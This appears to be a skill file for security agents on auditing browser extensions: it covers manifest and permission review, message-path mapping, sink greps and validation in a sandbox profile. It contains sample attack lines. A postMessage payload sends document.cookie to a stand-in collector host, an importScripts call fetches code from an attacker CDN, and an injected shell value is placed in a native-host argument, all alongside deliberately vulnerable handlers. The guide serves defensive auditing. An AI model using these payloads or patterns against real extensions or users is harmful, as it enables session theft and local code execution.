---
name: browser_extension
description: Browser extension assessment via manifest, permissions, content scripts, and message-passing analysis to find privilege escalation and data exfiltration.
---

# Browser Extension

A browser extension is a signed bundle (a `.crx`/`.xpi`/`.zip`, or an unpacked directory) of HTML, JS, CSS, and a `manifest.json` that runs with elevated privileges inside Chrome/Edge/Firefox. Extensions straddle two trust boundaries: untrusted web page content on one side and privileged browser APIs (cookies, tabs, webRequest, native messaging, `<all_urls>`) on the other. The attacker objective is to cross that boundary — get a malicious web page, a compromised dependency, or a crafted message to run with extension privileges and reach cookies, history, downloads, the file system, or arbitrary host data. You are auditing the static bundle plus its runtime message paths, not a network service.

## Attack Surface

**Trust boundaries (where privilege is crossed)**
- Web page DOM ↔ content script (shared DOM, isolated JS worlds, but the page controls the DOM the content script reads)
- Content script ↔ background/service worker (`chrome.runtime.sendMessage`, `connect`/`Port`)
- Any web origin ↔ extension (`externally_connectable`, `chrome.runtime.onMessageExternal`)
- Extension ↔ native host binary (`nativeMessaging`, stdin/stdout JSON to a local executable)
- Extension pages ↔ web (`web_accessible_resources` expose extension files to page origins)
- DevTools/sidepanel/options/popup pages ↔ background

**High-value capabilities to enumerate (manifest permissions)**
- `<all_urls>` / broad `host_permissions` — read/modify any site, steal cookies/session
- `cookies`, `webRequest`/`webRequestBlocking`, `proxy`, `tabs`, `history`, `bookmarks`, `downloads`
- `nativeMessaging` — bridge to a local binary (RCE pivot)
- `debugger` — attach Chrome DevTools Protocol to any tab (full page control)
- `scripting`/`tabs.executeScript`, `declarativeNetRequest`, `clipboardRead`, `management`

**Code sinks inside the bundle**
- `eval`, `new Function`, `setTimeout("string")`, `chrome.tabs.executeScript({code:...})`
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write` in content/extension pages
- `postMessage` handlers without `origin` checks; `JSON.parse` of attacker data into a DOM sink
- `fetch`/`XMLHttpRequest` to hardcoded C2-style or analytics endpoints; remote-hosted code (`importScripts`, remote `<script>`)

## Recon & Enumeration

```bash
# --- Acquire and unpack the bundle ---
# CRX/XPI/ZIP are all ZIP containers (CRX has a header before the ZIP; unzip skips it)
unzip -o extension.crx -d ext_src 2>/dev/null || \
  binwalk --dd='zip:zip' extension.crx && unzip -o *.zip -d ext_src
unzip -o extension.xpi -d ext_src        # Firefox

# Pull a Chrome extension straight from the Web Store by ID
EXT_ID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
curl -sL "https://clients2.google.com/service/update2/crx?response=redirect&prodversion=120&acceptformat=crx2,crx3&x=id%3D${EXT_ID}%26uc" -o extension.crx

# --- Manifest first: version, permissions, sinks, entry points ---
jq '{mv:.manifest_version, perms:.permissions, host:.host_permissions, opt:.optional_permissions,
     ext_conn:.externally_connectable, war:.web_accessible_resources, csp:.content_security_policy,
     bg:.background, cs:.content_scripts, nm:(.permissions|index("nativeMessaging"))}' ext_src/manifest.json

# --- Beautify minified/bundled JS so static analysis sees the real code ---
find ext_src -name '*.js' -exec npx --yes js-beautify -r {} \; 2>/dev/null
# Source maps often ship by accident — reconstruct original sources if present:
find ext_src -name '*.map' -exec npx --yes source-map-cli {} \; 2>/dev/null

# --- Grep the dangerous sinks and capability calls ---
grep -rnE "eval\(|new Function|setTimeout\(['\"]|executeScript|innerHTML|insertAdjacentHTML|document\.write|importScripts" ext_src
grep -rnE "onMessage(External)?|sendMessage|runtime\.connect|addEventListener\(['\"]message" ext_src
grep -rnE "chrome\.(cookies|tabs|debugger|proxy|webRequest|downloads|scripting)|nativeMessaging" ext_src

# --- Secrets, keys, and embedded endpoints ---
trufflehog filesystem ext_src --only-verified --json
gitleaks detect --no-git --source ext_src -f json -r gitleaks.json
grep -rnoE "https?://[a-zA-Z0-9./_-]+" ext_src | sort -u        # exfil/C2/remote-code hosts

# --- SAST: extension-aware rules + JS injection rules ---
semgrep --config p/javascript --config p/xss --config p/secrets ext_src
semgrep --config "r/javascript.browser-extension" ext_src 2>/dev/null

# --- Dependency / supply-chain hygiene of the bundled libs ---
# If node_modules or a lockfile shipped, scan it; otherwise fingerprint vendored libs by hash/version string
trivy fs --scanners vuln,secret ext_src
grep -rhoE "/\*!? *[A-Za-z0-9._-]+ v?[0-9]+\.[0-9]+\.[0-9]+" ext_src | sort -u   # vendored lib versions -> CVE lookup

# --- For nativeMessaging hosts: locate the manifest + binary the extension talks to ---
ls ~/.config/google-chrome/NativeMessagingHosts/ /etc/opt/chrome/native-messaging-hosts/ 2>/dev/null
jq '{name,path,type,allowed_origins}' /etc/opt/chrome/native-messaging-hosts/*.json 2>/dev/null
```

Install/asset-specific tools if not already present:
- `npm i -g js-beautify source-map-cli` (deobfuscate/unbundle)
- `pip install crxcavator` or use the open `crxcavator`/`ext-analysis` rulesets for risk scoring
- `apt-get install -y binwalk` (carve nested ZIPs from CRX), `unzip`, `jq`
- Use Chrome with `--load-extension=$PWD/ext_src --user-data-dir=/tmp/ext_profile` for live runtime testing (see `agent_browser` skill).

## Methodology

1. **Acquire and normalize.** Unpack the CRX/XPI/ZIP, beautify all JS, recover any `.map` sources. Note `manifest_version` (MV2 vs MV3 changes the threat model: MV2 has persistent background pages + remote code + blocking `webRequest`; MV3 forces a service worker and `declarativeNetRequest`).
2. **Manifest threat model.** Inventory every permission and host pattern. Flag the over-broad set (`<all_urls>`, `cookies`, `nativeMessaging`, `debugger`, `proxy`, blocking `webRequest`). For each, find the code that uses it — unused dangerous permissions are still attack surface if an XSS lands inside the extension.
3. **Map message paths.** Build a graph: which web origins can reach the extension (`externally_connectable`, `onMessageExternal`), which content scripts post to the background, what the background does with each message `type`. The privilege boundary is crossed wherever attacker-controlled data reaches a privileged `chrome.*` call.
4. **CSP & remote code review.** Read `content_security_policy`. Look for `unsafe-eval`, `unsafe-inline`, wildcard `script-src`, or remote `script-src` hosts that allow loading attacker-controlled code into the extension context.
5. **Sink analysis in each context.** Separately audit content scripts (page-DOM-adjacent), extension pages (popup/options/background, extension origin), and `web_accessible_resources` (page-reachable). DOM-XSS in an extension page runs with full extension privileges; in a content script it runs in the isolated world but still controls the page.
6. **`web_accessible_resources` exposure.** List every WAR entry. Each is fetchable/embeddable by web pages — check for resources that leak data, accept query params into sinks, or enable fingerprinting (`web_accessible_resources` with `<all_urls>` matches).
7. **Native messaging chain.** If `nativeMessaging` is present, locate the host manifest, its `allowed_origins`, and the target binary. Audit how the binary parses extension JSON (command injection, path traversal, deserialization) — this is the RCE pivot.
8. **Runtime validation.** Load the unpacked extension in a disposable Chrome profile, open a page you control, and fire crafted messages / `postMessage` / page-DOM payloads to confirm the static findings reach the privileged calls.

## Key Weaknesses / Techniques

**Unauthenticated/over-permissive message handlers.** A background handler that trusts any message without verifying `sender`:
```js
// vulnerable: no sender check, reflects into a privileged sink
chrome.runtime.onMessageExternal.addListener((msg, sender, sendResponse) => {
  if (msg.action === 'exec') chrome.tabs.executeScript({ code: msg.code });   // any web origin -> code in any tab
});
```
Assess by sending from a page you control (works only if `externally_connectable.matches` includes your origin, or is missing — which in MV2 defaults to all):
```js
chrome.runtime.sendMessage("EXTENSION_ID_HERE", { action: "exec", code: "document.title" }, r => console.log(r));
```

**Missing `postMessage`/`window` message origin checks.** Content scripts that listen on the page and forward to the background without `event.origin`/`event.source` validation let any iframe or page script drive extension privileges:
```js
window.addEventListener('message', e => chrome.runtime.sendMessage({ url: e.data.url }));  // no origin check
```
Payload from the page: `window.postMessage({url:'https://collector.example/'+document.cookie}, '*')`.

**DOM-XSS in extension pages → privileged JS execution.** `innerHTML` of attacker data in the options/popup/background page runs in the extension origin (can call any granted `chrome.*`). Confirm with a benign marker payload:
```html
<img src=x onerror="chrome.cookies&&console.log('priv-context-confirmed')">
```

**Weak/over-broad CSP allowing remote or inline code.** `"content_security_policy": "script-src 'self' 'unsafe-eval' https://*; object-src 'self'"` lets a single injected string become code execution in the extension. Combined with a DOM sink, this is full-privilege XSS.

**`web_accessible_resources` data leak / clickjacking.** A WAR HTML page that reads `location.hash`/query into `innerHTML` is XSS reachable from any web page that frames `chrome-extension://ID/page.html#payload`.

**Native messaging command/argument injection.** Extension forwards page-controlled strings to a host binary that shells out:
```python
# host binary (vulnerable): builds a shell command from extension input
subprocess.run("convert " + msg["file"], shell=True)   # msg.file = "x; id > /tmp/pwn"
```
This turns an extension-context compromise into local RCE.

**Hardcoded secrets / silent exfiltration / remote code.** API keys, OAuth secrets, or analytics tokens in the bundle; `importScripts('https://cdn.attacker/runtime.js')` or appended `<script src=remote>` that pulls updatable code outside store review.

**`declarativeNetRequest`/`webRequest` abuse.** Rules that rewrite requests, strip CSP/`X-Frame-Options`, inject headers, or redirect auth endpoints — verify the rule set isn't downgrading the security of pages it touches.

## Validation

1. **Static-to-runtime link.** For each finding, show the exact line where attacker-controlled data enters and the exact privileged `chrome.*` call it reaches. A finding is real only when both endpoints are reachable from a non-extension origin (web page, arbitrary message sender, native host).
2. **Reproduce in a sandbox profile.** Load the unpacked source: `google-chrome --load-extension=$PWD/ext_src --user-data-dir=/tmp/ext_profile --no-first-run`. Note the assigned extension ID from `chrome://extensions`.
3. **Drive the boundary.** From a page you serve locally (`python3 -m http.server`), send the crafted message / `postMessage` / WAR-frame payload and observe the privileged effect (a cookie read, a tab script execution, an outbound `fetch`) in the background service worker console and DevTools Network tab.
4. **Benign PoC only.** Demonstrate impact with a harmless marker: read `document.title` or a single non-sensitive cookie name, or trigger one OAST callback for exfil — `interactsh-client` gives a `*.oast.fun` domain; inject it as the exfil URL and confirm the inbound hit, then stop.
5. **Native messaging PoC.** If proving host RCE, use an innocuous command (`id > /tmp/poc_marker`) and capture the file as evidence rather than anything destructive.

## False Positives

- Dangerous permission declared but no code path uses it (still note as least-privilege violation, but not exploitable on its own).
- `onMessage` handlers that strictly validate `sender.id`/`sender.origin` and reject unknown senders — message injection blocked.
- `externally_connectable.matches` scoped to a specific first-party origin you do not control — external messaging not attacker-reachable.
- `innerHTML` of static, developer-controlled strings or values already passed through `DOMPurify`/`textContent`.
- `eval`/`new Function` confined to bundler runtime shims (webpack `__webpack_require__`) operating on constant module maps, not external input.
- Secrets that are public client identifiers (e.g., OAuth client IDs, public Sentry DSNs) rather than true secrets — verify the key class before reporting.
- Content-script DOM-XSS where the injected code runs only in the isolated world with no granted privileges and no message path to the background — limited to page-level impact already available to the page.

## Chaining & Impact

- Web-page → unauthenticated message handler → `cookies`/`tabs` permission = **session theft across every site the user visits**.
- DOM-XSS in extension page + permissive CSP → code in extension origin → `chrome.tabs.executeScript`/`scripting` = **universal page injection** (read/modify any open tab, harvest credentials).
- External message → `nativeMessaging` → host binary command injection = **browser-to-local RCE** on the user's machine.
- `debugger` permission abuse → attach CDP to any tab → **full DOM/network control, bypass of site CSP**.
- `webRequest`/`declarativeNetRequest` rule injection → strip CSP/CORS, redirect OAuth → **token interception and MITM** within the browser.
- Supply-chain: compromised bundled dependency or remote-code endpoint → silent update of millions of installs → **mass credential/data exfiltration**.

## Pro Tips

1. Read the manifest before any JS. Permissions tell you the maximum blast radius; the JS just tells you which paths reach it.
2. MV2 `externally_connectable` is permissive by default — absence of the key in MV2 means any origin may message the extension. MV3 tightens this; always confirm the actual `manifest_version`.
3. Beautify and unbundle first. Webpack/rollup output hides the real handlers; ship `.map` files reconstruct original variable names and make sinks obvious.
4. The most valuable bug is the shortest path from a web origin to a privileged `chrome.*` call — trace messages backward from each `chrome.cookies`/`executeScript`/`nativeMessaging` call to its data source.
5. Isolated worlds protect JS, not the DOM: a content script reading the page DOM is reading attacker-controlled data even though page scripts can't touch the content script's variables.
6. `web_accessible_resources` is an under-tested surface — any listed file is a web-reachable extension-origin page; check every one for hash/query sinks and data leaks.
7. Check `optional_permissions` and runtime `chrome.permissions.request` — an extension may escalate quietly after install.
8. For native messaging, the host manifest's `allowed_origins` is the only auth between the page and a local binary; a wildcard or wrong extension ID there is critical.
9. Compare store version vs the bundle on disk — sideloaded/updated-out-of-band code that differs from the reviewed listing is a strong tampering signal.
